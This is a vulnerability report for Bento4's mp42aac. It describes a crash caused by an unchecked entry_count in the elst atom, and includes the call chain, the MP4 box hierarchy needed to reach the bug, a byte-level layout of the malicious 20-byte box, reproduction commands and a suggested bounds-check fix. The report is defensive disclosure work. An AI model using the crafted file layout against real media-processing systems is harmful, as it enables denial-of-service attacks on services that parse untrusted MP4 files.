# VULN 002 - AP4_ElstAtom Missing entry_count Bounds Check

## Vulnerability Summary

**Target**: Bento4 `mp42aac` binary  
**Component**: `AP4_ElstAtom` constructor (`Source/C++/Core/Ap4ElstAtom.cpp`)  
**Class**: DoS — unbounded memory allocation (std::bad_alloc)  
**CWE**: CWE-789 (Uncontrolled Memory Allocation)

## Root Cause

`AP4_ElstAtom::AP4_ElstAtom()` reads `entry_count` directly from the MP4 stream and immediately
calls `m_Entries.EnsureCapacity(entry_count)` without any sanity check against the actual
remaining bytes in the box or any maximum value guard.

With `entry_count = 0xFFFFFFFF` (4294967295) and `sizeof(AP4_ElstEntry) ≈ 20–24 bytes`:

```
0xFFFFFFFF × 20 ≈ 85.9 GB
```

On a 64-bit system, `AP4_Array<AP4_ElstEntry>::EnsureCapacity` attempts to `malloc`/`new[]`
~86 GB, which the kernel immediately refuses, producing `std::bad_alloc` and crashing the
process — a clean Denial-of-Service.

**Trigger call chain**:
```
mp42aac
  → AP4_File::AP4_File()
  → AP4_AtomFactory::CreateAtomFromStream()
  → AP4_ElstAtom::Create()
  → AP4_ElstAtom::AP4_ElstAtom()   ← reads entry_count
    → m_Entries.EnsureCapacity(0xFFFFFFFF)  ← crash
```

## PoC Approach

### MP4 Structure Crafted

```
ftyp  (M4A brand)
moov
  mvhd
  trak
    tkhd  (track_id=1, audio)
    edts
      elst  ← TRIGGER: 20-byte box, entry_count=0xFFFFFFFF
    mdia
      mdhd  (44100 Hz timescale)
      hdlr  (handler_type='soun')
      minf
        smhd
        dinf  (dref: self-contained url)
        stbl
          stsd  (mp4a sample entry)
          stts  (1 entry)
          stsc  (1 entry)
          stsz  (1 sample)
          stco  (1 chunk)
```

### The Malicious elst Box

```
Offset  Length  Value       Field
0       4       0x00000014  size = 20 bytes
4       4       'elst'      box type
8       1       0x00        version = 0
9       3       0x000000    flags = 0
12      4       0xFFFFFFFF  entry_count = 4294967295  ← lie
16      -       (nothing)   NO actual entries
```

The box declares 4,294,967,295 entries but contains zero. The code trusts `entry_count`
unconditionally, calls `EnsureCapacity(0xFFFFFFFF)`, and crashes before any entry is read.

### Why the Full MP4 Structure Is Needed

`mp42aac` parses the file sequentially and constructs a full `AP4_File` object. Atoms not
wrapped in the correct `moov → trak → edts` hierarchy are ignored or rejected before the
factory reaches the elst atom. A minimal but structurally valid track (with mdia, stbl, etc.)
is required so the parser does not bail out early.

## Reproduction

```bash
python3 vuln_002_gen.py          # creates vuln_002.mp4
bash   vuln_002_run.sh           # runs mp42aac, captures output
cat    vuln_002_result.txt       # inspect ASAN / crash output
```

## Expected Output (with ASAN build)

```
==NNNNN==ERROR: AddressSanitizer: out-of-memory ...
```
or
```
terminate called after throwing an instance of 'std::bad_alloc'
  what():  std::bad_alloc
Aborted (core dumped)
```

## Fix Recommendation

In `AP4_ElstAtom::AP4_ElstAtom()`, validate `entry_count` against the remaining box bytes
before calling `EnsureCapacity`:

```cpp
// For version==0: each entry is 12 bytes
// For version==1: each entry is 20 bytes
AP4_UI32 entry_size = (version == 1) ? 20 : 12;
AP4_UI32 max_entries = (size - 12) / entry_size;  // 12 = 4 size + 4 type + 4 version/flags
if (entry_count > max_entries) {
    return AP4_ERROR_INVALID_FORMAT;
}
```
